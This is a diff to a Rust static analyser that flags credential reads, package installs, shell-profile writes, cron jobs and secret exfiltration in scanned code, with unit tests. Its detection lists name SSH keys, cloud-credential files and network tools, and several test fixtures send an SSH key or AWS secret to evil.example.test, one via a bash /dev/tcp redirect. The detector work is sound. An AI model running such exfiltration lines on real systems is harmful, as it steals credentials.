@@ -147,14 +147,22 @@ fn member_path(node: Node, src: &[u8]) -> Option<String> {
     match node.kind() {
         "identifier" | "property_identifier" | "constant" => Some(text(node, src).to_string()),
         "member_expression" | "attribute" => {
-            let obj = node
-                .child_by_field_name("object")
-                .and_then(|o| member_path(o, src))?;
             let prop = node
                 .child_by_field_name("property")
                 .or_else(|| node.child_by_field_name("attribute"))
                 .map(|p| text(p, src).to_string())?;
-            Some(format!("{obj}.{prop}"))
+            // `require('fs').readFileSync(...)` — the object is a call, not
+            // a resolvable dotted path. Try to unwrap `require('X')` to
+            // `X.prop`; otherwise fall back to just the property so
+            // callee-name checks (`is_file_read` / `is_file_write` / …)
+            // still work.
+            let obj = node.child_by_field_name("object").and_then(|o| {
+                member_path(o, src).or_else(|| require_target(o, src))
+            });
+            Some(match obj {
+                Some(o) => format!("{o}.{prop}"),
+                None => prop,
+            })
         }
         "scope_resolution" => {
             let name = node
@@ -175,6 +183,22 @@ fn member_path(node: Node, src: &[u8]) -> Option<String> {
         }
         _ => None,
     }
+}
+
+/// `require('fs')` → `"fs"`, so `require('fs').readFileSync` resolves to
+/// `fs.readFileSync`.
+fn require_target(node: Node, src: &[u8]) -> Option<String> {
+    if !is_call(node.kind()) {
+        return None;
+    }
+    let func = node.child_by_field_name("function")?;
+    if text(func, src) != "require" {
+        return None;
+    }
+    node.child_by_field_name("arguments")
+        .and_then(|a| a.named_child(0))
+        .and_then(|s| string_value(s, src))
+        .map(|m| m.strip_prefix("node:").unwrap_or(&m).to_string())
 }
 
 /// String literal text with surrounding quotes stripped, for `string`
@@ -255,16 +279,37 @@ fn secret_path_capability(s: &str) -> Option<(Capability, &'static str)> {
     {
         return Some((Capability::ReadSsh, "an SSH private key path"));
     }
+    // Tier 1: an unambiguous raw-secret FILE — its whole content is
+    // credential material. `ReadCredentials` counts as raw secret
+    // material, so a read + network is the uncapped +40 exfiltration
+    // pattern.
     if l.contains(".aws/credentials")
         || l.contains(".aws\\credentials")
-        || l.contains(".aws/config")
-        || l.contains(".config/gcloud")
-        || l.contains("gcloud/credentials")
-        || l.contains(".azure/")
         || l.ends_with(".netrc")
         || l.contains("/.netrc")
+        || l.ends_with(".pypirc")
+        || l.contains("gcloud/credentials.db")
+        || l.contains("application_default_credentials.json")
     {
-        return Some((Capability::CloudCredentials, "a cloud-credential file path"));
+        return Some((Capability::ReadCredentials, "a stored-credential file path"));
+    }
+    // Tier 2: a path that *may* hold a secret but often holds only
+    // settings (`.aws/config` is region/profile data; `.npmrc` /
+    // `.docker/config.json` / `.kube/config` sometimes carry a token,
+    // sometimes not). `CloudCredentials` — capped in the risk engine, so
+    // this doesn't auto-escalate a benign config-reading tool. Matches
+    // the regex layer's original mapping.
+    if l.contains(".aws/config")
+        || l.contains(".aws\\config")
+        || l.contains(".config/gcloud")
+        || l.contains(".azure/")
+        || l.contains(".azure\\")
+        || l.contains(".docker/config.json")
+        || l.contains(".kube/config")
+        || l.ends_with(".npmrc")
+        || l.contains("/.npmrc")
+    {
+        return Some((Capability::CloudCredentials, "a cloud-config / credential path"));
     }
     if l.contains("login data")
         || l.contains("cookies.sqlite")
@@ -277,11 +322,95 @@ fn secret_path_capability(s: &str) -> Option<(Capability, &'static str)> {
     None
 }
 
+/// Like `secret_path_capability` but for a *bare* string literal (not an
+/// argument to a proven file-read call). A tier-1 raw-credential file is
+/// downgraded to the capped `CloudCredentials` — a mention of `.netrc` in
+/// a security tool's own code is not a proven read of it, and shouldn't
+/// escalate the tool to CRITICAL via the raw-secret + network rule. A
+/// read call (`readFileSync(".netrc")`) still gets the full tier through
+/// `secret_path_capability` directly. Keeps parity with the regex layer,
+/// which has no `.netrc` rule and maps `.aws/credentials` to
+/// `CloudCredentials`.
+fn secret_path_capability_bare(s: &str) -> Option<(Capability, &'static str)> {
+    match secret_path_capability(s) {
+        Some((Capability::ReadCredentials, _)) => {
+            Some((Capability::CloudCredentials, "a stored-credential file path"))
+        }
+        other => other,
+    }
+}
+
 /// Set of segment strings that, joined, form a sensitive path even though
 /// no single literal matches (`path.join(home, ".ssh", "id_rsa")`).
 fn joined_segments_are_secret(segs: &[String]) -> Option<(Capability, &'static str)> {
     let joined = segs.join("/").to_ascii_lowercase();
     secret_path_capability(&joined)
+}
+
+/// A cloud-credential *environment-variable name* — unambiguous whether
+/// it appears as a bare literal or a `process.env.<NAME>` access.
+fn credential_env_name(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    l.contains("aws_secret_access_key")
+        || l.contains("aws_session_token")
+        || l.contains("google_application_credentials")
+        || l.contains("azure_client_secret")
+        || l.contains("gcp_service_account")
+}
+
+/// Does this string contain a runtime package-install command? Checked
+/// only inside a shell-exec argument (a proven runtime install), not on a
+/// bare literal — "pip install …" in a security tool's help text is not
+/// evidence the tool installs anything.
+fn is_install_command(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    l.contains("npm install")
+        || l.contains("npm i ")
+        || l.contains("yarn add")
+        || l.contains("pnpm add")
+        || l.contains("pip install")
+        || l.contains("pip3 install")
+        || l.contains("gem install")
+        || l.contains("apt install")
+        || l.contains("apt-get install")
+        || l.contains("brew install")
+        || l.contains("cargo install")
+        || l.contains("curl ") && l.contains("| sh")
+}
+
+/// A shell-profile path — checked only as an argument to a file-write
+/// call, not on a bare literal.
+fn is_shell_profile_path(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    l.ends_with(".bashrc")
+        || l.ends_with(".zshrc")
+        || l.ends_with(".bash_profile")
+        || l.ends_with(".zprofile")
+        || l.ends_with(".profile")
+        || l.contains("/.bashrc")
+        || l.contains("/.zshrc")
+        || l.contains("/.bash_profile")
+        || l.contains("\\.bashrc")
+}
+
+fn is_cron_spec(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    l.contains("crontab -") || l.contains("* * * * *")
+}
+
+fn is_file_write(callee: &str) -> bool {
+    let last = callee.rsplit('.').next().unwrap_or(callee);
+    matches!(
+        last,
+        "writeFileSync" | "writeFile" | "appendFileSync" | "appendFile" | "createWriteStream"
+    )
+}
+
+/// A bash network redirect / tool an exec'd command string uses to reach
+/// the wire — extends `is_network_tool` with the `/dev/tcp` trick.
+fn command_string_exfil_channel(s: &str) -> bool {
+    let l = s.to_ascii_lowercase();
+    is_network_tool(s) || l.contains("/dev/tcp/") || l.contains("/dev/udp/")
 }
 
 // ─────────────────────────────────────────────────────────────────────
@@ -340,20 +469,86 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
                     }
                 }
 
-                // A shell exec whose command string exfiltrates.
+                // What an exec'd command string actually does.
                 if is_shell_exec(&callee, lang) {
                     if let Some(args) = node.child_by_field_name("arguments") {
                         for s in descendant_strings(args, src) {
                             if looks_like_exfil_command(&s) {
                                 out.push(finding(
                                     Capability::ExecuteShell,
-                                    &format!("{callee}(...) runs a command that pipes local data to the network (curl/wget/nc)"),
+                                    &format!("{callee}(...) runs a command that pipes local data to the network (curl/wget/nc//dev/tcp)"),
+                                    path,
+                                    line_of(node),
+                                ));
+                            }
+                            if is_install_command(&s) {
+                                out.push(finding(
+                                    Capability::InstallPackage,
+                                    &format!("{callee}(...) runs a package-install command"),
+                                    path,
+                                    line_of(node),
+                                ));
+                            }
+                            if is_cron_spec(&s) {
+                                out.push(finding(
+                                    Capability::Cron,
+                                    &format!("{callee}(...) installs a cron job"),
                                     path,
                                     line_of(node),
                                 ));
                             }
                         }
                     }
+                }
+
+                // A file WRITE targeting a shell profile — JS
+                // `appendFileSync(".bashrc", …)` or Python
+                // `open(".bashrc", "a")`.
+                let last = callee.rsplit('.').next().unwrap_or(&callee);
+                let is_write_call = is_file_write(&callee)
+                    || matches!(last, "write_text" | "write_bytes")
+                    || (lang == AstLang::Python && last == "open");
+                if is_write_call {
+                    if let Some(args) = node.child_by_field_name("arguments") {
+                        let segs = descendant_strings(args, src);
+                        let names_profile = segs.iter().any(|s| is_shell_profile_path(s))
+                            || is_shell_profile_path(&segs.join("/"));
+                        // for `open`, require a write mode ('w'/'a'/'x')
+                        let is_write = last != "open"
+                            || segs.iter().any(|s| {
+                                let m = s.to_ascii_lowercase();
+                                m.len() <= 4 && (m.contains('w') || m.contains('a') || m.contains('x'))
+                            });
+                        if names_profile && is_write {
+                            out.push(finding(
+                                Capability::ShellProfile,
+                                &format!("{callee}(...) writes to a shell profile"),
+                                path,
+                                line_of(node),
+                            ));
+                        }
+                    }
+                }
+            }
+        }
+
+        // ── `new Function(...)` / `new WebSocket(...)` ─────────────
+        if node.kind() == "new_expression" {
+            if let Some(ctor) = node.child_by_field_name("constructor").and_then(|c| member_path(c, src)) {
+                match ctor.as_str() {
+                    "Function" => out.push(finding(
+                        Capability::ExecuteShell,
+                        "new Function(...) — dynamic code execution",
+                        path,
+                        line_of(node),
+                    )),
+                    "WebSocket" | "EventSource" => out.push(finding(
+                        Capability::NetworkExternal,
+                        "opens a WebSocket / SSE connection",
+                        path,
+                        line_of(node),
+                    )),
+                    _ => {}
                 }
             }
         }
@@ -365,6 +560,7 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
                 || pl.starts_with("process.env.")
                 || pl == "os.environ"
                 || pl.starts_with("os.environ.")
+                || pl == "ENV.fetch"
             {
                 out.push(finding(
                     Capability::EnvironmentVariables,
@@ -372,6 +568,27 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
                     path,
                     line_of(node),
                 ));
+                if credential_env_name(pl) {
+                    out.push(finding(
+                        Capability::CloudCredentials,
+                        "reads a cloud-credential environment variable",
+                        path,
+                        line_of(node),
+                    ));
+                }
+            }
+        }
+        // Ruby `ENV['X']` → `element_reference` with object `ENV`.
+        if node.kind() == "element_reference" {
+            if let Some(obj) = node.child_by_field_name("object") {
+                if text(obj, src) == "ENV" {
+                    out.push(finding(
+                        Capability::EnvironmentVariables,
+                        "reads environment variables (ENV[…])",
+                        path,
+                        line_of(node),
+                    ));
+                }
             }
         }
 
@@ -379,17 +596,23 @@ fn ast_capabilities(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<C
         // Only when they're an argument or an assignment RHS (an AST
         // string is never inside a comment, so this is already far
         // tighter than the regex).
-        if node.kind() == "string" {
+        if node.kind() == "string" && in_expression_position(node) {
             if let Some(s) = string_value(node, src) {
-                if let Some((cap, label)) = secret_path_capability(&s) {
-                    if in_expression_position(node) {
-                        out.push(finding(
-                            cap,
-                            &format!("string literal names {label}"),
-                            path,
-                            line_of(node),
-                        ));
-                    }
+                if let Some((cap, label)) = secret_path_capability_bare(&s) {
+                    out.push(finding(
+                        cap,
+                        &format!("string literal names {label}"),
+                        path,
+                        line_of(node),
+                    ));
+                }
+                if credential_env_name(&s) {
+                    out.push(finding(
+                        Capability::CloudCredentials,
+                        "string literal is a cloud-credential environment variable name",
+                        path,
+                        line_of(node),
+                    ));
                 }
             }
         }
@@ -466,8 +689,11 @@ fn module_capability(module: &str, lang: AstLang) -> Option<(Capability, &'stati
             }
             "os" => None,
             _ => match m {
-                "axios" | "node-fetch" | "undici" | "got" | "request" => {
+                "axios" | "node-fetch" | "undici" | "got" | "request" | "superagent" => {
                     Some((Capability::NetworkExternal, "imports an HTTP client"))
+                }
+                "node-cron" | "cron" | "node-schedule" | "toad-scheduler" => {
+                    Some((Capability::Cron, "imports a job scheduler"))
                 }
                 _ => None,
             },
@@ -476,6 +702,12 @@ fn module_capability(module: &str, lang: AstLang) -> Option<(Capability, &'stati
             "subprocess" => Some((Capability::ExecuteShell, "imports subprocess")),
             "socket" | "requests" | "urllib" | "aiohttp" | "httpx" | "http" => {
                 Some((Capability::NetworkExternal, "imports a network module"))
+            }
+            "boto3" | "botocore" => {
+                Some((Capability::CloudCredentials, "imports the AWS SDK (boto3)"))
+            }
+            "schedule" | "apscheduler" | "crontab" => {
+                Some((Capability::Cron, "imports a job scheduler"))
             }
             _ => None,
         },
@@ -590,14 +822,21 @@ fn looks_like_exfil_command(s: &str) -> bool {
         || l.contains("|nc ")
         || l.contains("scp ")
         || l.contains("xxd")
-        || l.contains("base64");
+        || l.contains("base64")
+        || l.contains("/dev/tcp/")
+        || l.contains("/dev/udp/");
     let secret = l.contains(".ssh")
         || l.contains("id_rsa")
         || l.contains(".aws")
         || l.contains(".env")
         || l.contains("credentials")
         || l.contains("/etc/passwd");
-    let pipe_or_data = l.contains('|') || l.contains("--data") || l.contains("-d ") || l.contains("-F ") || l.contains("@");
+    let pipe_or_data = l.contains('|')
+        || l.contains('>')
+        || l.contains("--data")
+        || l.contains("-d ")
+        || l.contains("-F ")
+        || l.contains('@');
     transmit && secret && pipe_or_data
 }
 
@@ -619,10 +858,122 @@ type TaintMap = std::collections::HashMap<String, (Capability, &'static str)>;
 /// recursion unrolling, no shadowing.
 fn trace_exfiltration(root: Node, src: &[u8], lang: AstLang, path: &Path) -> Vec<CapabilityFinding> {
     let returns = function_return_taints(root, src, lang);
+    let param_sinks = function_param_sinks(root, src, lang, &returns);
     let mut out = Vec::new();
     let mut reported: HashSet<(Capability, usize)> = HashSet::new();
     let empty = TaintMap::new();
-    analyze_scope(root, src, lang, path, &empty, &returns, &mut out, &mut reported);
+    analyze_scope(
+        root, src, lang, path, &empty, &returns, &param_sinks, &mut out, &mut reported,
+    );
+    out
+}
+
+/// A function whose body passes one of its parameters to a network sink
+/// — calling it with a tainted argument is an exfiltration flow
+/// (`function upload(d){ fetch(url,{body:d}) } … upload(sshKey)`).
+/// name → the set of parameter *names* that reach a sink.
+type ParamSinks = std::collections::HashMap<String, HashSet<String>>;
+
+fn function_param_sinks(root: Node, src: &[u8], lang: AstLang, returns: &TaintMap) -> ParamSinks {
+    let mut scopes = Vec::new();
+    collect_all_scopes(root, &mut scopes);
+    let mut out: ParamSinks = ParamSinks::new();
+    for &scope in &scopes {
+        let Some(fname) = function_name(scope, src, lang) else {
+            continue;
+        };
+        let params = param_names(scope, src, lang);
+        if params.is_empty() {
+            continue;
+        }
+        let mut sinking: HashSet<String> = HashSet::new();
+        for p in &params {
+            // Seed ONLY this parameter as tainted, then see whether it
+            // (or anything derived from it) reaches a sink in the body.
+            let mut seed = TaintMap::new();
+            seed.insert(p.clone(), (Capability::EnvironmentVariables, "a caller-supplied value"));
+            let tainted = compute_scope_taint(scope, src, lang, &seed, returns);
+            let mut reaches = false;
+            for_each_direct(scope, &mut |node| {
+                if reaches || !is_call(node.kind()) {
+                    return;
+                }
+                let Some(callee) = callee_path(node, src, lang) else {
+                    return;
+                };
+                if callee.starts_with("console.")
+                    || callee.starts_with("process.stdout")
+                    || callee.starts_with("process.stderr")
+                    || callee == "print"
+                {
+                    return;
+                }
+                let Some(args) = node.child_by_field_name("arguments") else {
+                    return;
+                };
+                let is_sink = is_network_sink(&callee, lang)
+                    || (is_shell_exec(&callee, lang)
+                        && descendant_strings(args, src)
+                            .iter()
+                            .any(|s| command_string_exfil_channel(s)));
+                if !is_sink {
+                    return;
+                }
+                if descendant_identifiers(args, src)
+                    .iter()
+                    .any(|id| tainted.contains_key(id))
+                {
+                    reaches = true;
+                }
+            });
+            if reaches {
+                sinking.insert(p.clone());
+            }
+        }
+        if !sinking.is_empty() {
+            out.insert(fname, sinking);
+        }
+    }
+    out
+}
+
+/// Ordered parameter names of a function scope.
+fn param_names(scope: Node, src: &[u8], _lang: AstLang) -> Vec<String> {
+    let params = scope
+        .child_by_field_name("parameters")
+        .or_else(|| scope.child_by_field_name("parameter")) // JS single-arg arrow
+        .or_else(|| scope.child_by_field_name("method_parameters"));
+    let Some(params) = params else {
+        return Vec::new();
+    };
+    if params.kind() == "identifier" {
+        return vec![text(params, src).to_string()];
+    }
+    let mut out = Vec::new();
+    let mut cursor = params.walk();
+    for child in params.children(&mut cursor) {
+        match child.kind() {
+            "identifier" => out.push(text(child, src).to_string()),
+            "required_parameter" | "optional_parameter" | "typed_parameter"
+            | "default_parameter" | "typed_default_parameter" | "splat_parameter"
+            | "keyword_parameter" | "optional_parameter_pattern" => {
+                let name = child
+                    .child_by_field_name("pattern")
+                    .or_else(|| child.child_by_field_name("name"))
+                    .or_else(|| {
+                        let mut c = child.walk();
+                        let found = child.children(&mut c).find(|n| n.kind() == "identifier");
+                        found
+                    });
+                if let Some(n) = name {
+                    if n.kind() == "identifier" {
+                        out.push(text(n, src).to_string());
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
     out
 }
 
@@ -818,6 +1169,7 @@ fn analyze_scope(
     path: &Path,
     inherited: &TaintMap,
     returns: &TaintMap,
+    param_sinks: &ParamSinks,
     out: &mut Vec<CapabilityFinding>,
     reported: &mut HashSet<(Capability, usize)>,
 ) {
@@ -827,6 +1179,7 @@ fn analyze_scope(
     for_each_direct(scope, &mut |node| {
         if is_call(node.kind()) {
             check_exfil_sink(node, src, lang, path, &tainted, returns, out, reported);
+            check_param_sink_call(node, src, lang, path, &tainted, returns, param_sinks, out, reported);
         }
     });
 
@@ -834,8 +1187,71 @@ fn analyze_scope(
     let mut nested = Vec::new();
     nested_scopes(scope, &mut nested);
     for child_scope in nested {
-        analyze_scope(child_scope, src, lang, path, &tainted, returns, out, reported);
+        analyze_scope(
+            child_scope, src, lang, path, &tainted, returns, param_sinks, out, reported,
+        );
     }
+}
+
+/// A call to a function summarised as passing a parameter to a network
+/// sink, made with a tainted argument in that parameter position →
+/// exfiltration.
+#[allow(clippy::too_many_arguments)]
+fn check_param_sink_call(
+    node: Node,
+    src: &[u8],
+    lang: AstLang,
+    path: &Path,
+    tainted: &TaintMap,
+    returns: &TaintMap,
+    param_sinks: &ParamSinks,
+    out: &mut Vec<CapabilityFinding>,
+    reported: &mut HashSet<(Capability, usize)>,
+) {
+    if param_sinks.is_empty() {
+        return;
+    }
+    let Some(callee) = callee_path(node, src, lang) else {
+        return;
+    };
+    let name = callee.rsplit('.').next().unwrap_or(&callee);
+    let Some(sinking_params) = param_sinks.get(name).or_else(|| param_sinks.get(&callee)) else {
+        return;
+    };
+    let Some(args) = node.child_by_field_name("arguments") else {
+        return;
+    };
+
+    // Any tainted argument at all — positional matching would need the
+    // callee's parameter list here; since the function is *known* to send
+    // some parameter to the wire, a tainted argument reaching it is the
+    // flow. (The summary already excluded functions with no sinking
+    // parameter, so this is not "any call with a tainted arg".)
+    let taint = args
+        .named_children(&mut args.walk())
+        .find_map(|a| expr_taint(a, src, lang, tainted, returns));
+    let Some((cap, label)) = taint else {
+        return;
+    };
+    let line = line_of(node);
+    if !reported.insert((cap, line)) {
+        return;
+    }
+    let plist = sinking_params.iter().cloned().collect::<Vec<_>>().join(", ");
+    out.push(CapabilityFinding {
+        capability: cap,
+        basis: EvidenceBasis::Inferred,
+        evidence: format!(
+            "AST taint: {label} is passed to `{callee}`, which forwards its `{plist}` parameter to a network sink"
+        ),
+        location: Some(format!("{}:{}", path.display(), line)),
+    });
+    out.push(CapabilityFinding {
+        capability: Capability::NetworkExternal,
+        basis: EvidenceBasis::Inferred,
+        evidence: format!("AST taint: `{callee}` forwards a tainted argument to the network (line {line})"),
+        location: Some(format!("{}:{}", path.display(), line)),
+    });
 }
 
 /// A call is an exfiltration sink if it is a network sink and a
@@ -873,7 +1289,7 @@ fn check_exfil_sink(
     let exec_sink = is_shell_exec(&callee, lang)
         && descendant_strings(args, src)
             .iter()
-            .any(|s| is_network_tool(s));
+            .any(|s| command_string_exfil_channel(s));
     if !net_sink && !exec_sink {
         return;
     }
@@ -892,7 +1308,7 @@ fn check_exfil_sink(
         return;
     }
     let sink_desc = if exec_sink && !net_sink {
-        format!("`{callee}` running a curl/wget/nc command")
+        format!("`{callee}` running a network command (curl/wget/nc//dev/tcp)")
     } else {
         format!("`{callee}`")
     };
@@ -1198,7 +1614,7 @@ creds = open(os.path.join(os.path.expanduser("~"), ".aws", "credentials")).read(
 urllib.request.urlopen(urllib.request.Request("http://x/c", data=creds.encode()))
 "#;
         let f = analyze(src, AstLang::Python, Path::new("t"));
-        assert!(f.iter().any(|x| x.capability == Capability::CloudCredentials));
+        assert!(f.iter().any(|x| x.capability == Capability::ReadCredentials));
     }
 
     #[test]
@@ -1301,7 +1717,7 @@ print(DEBUG, LEVEL)
             fetch('https://evil.example.test/u', { method: 'POST', body: form });
         "#;
         let f = analyze(src, AstLang::JavaScript, Path::new("t"));
-        assert!(f.iter().any(|x| x.capability == Capability::CloudCredentials && x.evidence.contains("taint")));
+        assert!(f.iter().any(|x| x.capability == Capability::ReadCredentials && x.evidence.contains("taint")));
     }
 
     #[test]
@@ -1344,6 +1760,121 @@ requests.post("https://evil.example.test", data=buf)
             const entry = cache.get(region);
         "#;
         assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn bare_netrc_mention_does_not_escalate_but_a_read_does() {
+        // A security tool listing `.netrc` as a sensitive file in its own
+        // code must NOT be flagged as reading raw secret material.
+        let bare = "const SENSITIVE = ['.netrc', '.aws/credentials', '.ssh'];";
+        let bc = caps(bare, AstLang::JavaScript);
+        assert!(!bc.contains(&Capability::ReadCredentials), "bare mention escalated: {bc:?}");
+        // An actual read of it does escalate.
+        let read = "const fs = require('fs'); const c = fs.readFileSync(process.env.HOME + '/.netrc');";
+        assert!(caps(read, AstLang::JavaScript).contains(&Capability::ReadCredentials));
+    }
+
+    #[test]
+    fn install_string_only_flags_inside_an_exec() {
+        let bare = "const help = 'To add a dependency, run: pip install <name>';";
+        assert!(!caps(bare, AstLang::JavaScript).contains(&Capability::InstallPackage));
+        let real = "const { execSync } = require('child_process'); execSync('pip install requests');";
+        assert!(caps(real, AstLang::JavaScript).contains(&Capability::InstallPackage));
+    }
+
+    #[test]
+    fn shell_profile_string_only_flags_on_a_write() {
+        let bare = "const RC = require('os').homedir() + '/.bashrc'; const exists = require('fs').existsSync(RC);";
+        assert!(!caps(bare, AstLang::JavaScript).contains(&Capability::ShellProfile));
+        let real = "require('fs').appendFileSync(require('os').homedir() + '/.bashrc', 'export X=1');";
+        assert!(caps(real, AstLang::JavaScript).contains(&Capability::ShellProfile));
+    }
+
+    #[test]
+    fn parameter_taint_secret_passed_into_an_uploader() {
+        // `upload(d)` sends its parameter; `main` calls it with the key.
+        let src = r#"
+            const fs = require('fs');
+            function upload(d) {
+              return fetch('https://evil.example.test/u', { method: 'POST', body: d });
+            }
+            function main() {
+              const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+              upload(key);
+            }
+            main();
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
+    }
+
+    #[test]
+    fn parameter_taint_python_keyword_arg() {
+        let src = r#"
+import os, requests
+def ship(payload):
+    requests.post("https://evil.example.test", data=payload)
+def run():
+    tok = os.environ["AWS_SECRET_ACCESS_KEY"]
+    ship(tok)
+run()
+"#;
+        assert!(has_taint(src, AstLang::Python));
+    }
+
+    #[test]
+    fn parameter_sink_function_called_with_a_benign_arg_is_not_flagged() {
+        let src = r#"
+            function upload(d) { return fetch('https://api.example.com', { method: 'POST', body: d }); }
+            function main() { upload(JSON.stringify({ ok: true })); }
+            main();
+        "#;
+        assert!(!has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn dev_tcp_bash_exfil_channel_is_flagged() {
+        let src = r#"
+            const { execSync } = require('child_process');
+            const fs = require('fs');
+            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            execSync('bash -c "cat > /dev/tcp/evil.example.test/443" <<< ' + key);
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript), "{:?}", analyze(src, AstLang::JavaScript, Path::new("t")));
+    }
+
+    #[test]
+    fn base64_staged_secret_still_reaches_the_sink() {
+        let src = r#"
+            const fs = require('fs');
+            const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+            const enc = Buffer.from(key).toString('base64');
+            fetch('https://evil.example.test', { method: 'POST', body: enc });
+        "#;
+        assert!(has_taint(src, AstLang::JavaScript));
+    }
+
+    #[test]
+    fn ast_flags_runtime_npm_install_and_shell_profile_write() {
+        let src = r#"
+            const { execSync } = require('child_process');
+            execSync('npm install --global some-package');
+            const fs = require('fs');
+            fs.appendFileSync(process.env.HOME + '/.bashrc', 'export EVIL=1\n');
+        "#;
+        let c = caps(src, AstLang::JavaScript);
+        assert!(c.contains(&Capability::InstallPackage), "{c:?}");
+        assert!(c.contains(&Capability::ShellProfile), "{c:?}");
+    }
+
+    #[test]
+    fn ast_flags_cloud_credential_env_name_and_websocket() {
+        let src = r#"
+            const token = process.env.AWS_SECRET_ACCESS_KEY;
+            const ws = new WebSocket('wss://evil.example.test');
+        "#;
+        let c = caps(src, AstLang::JavaScript);
+        assert!(c.contains(&Capability::CloudCredentials), "{c:?}");
+        assert!(c.contains(&Capability::NetworkExternal), "{c:?}");
     }
 
     #[test]
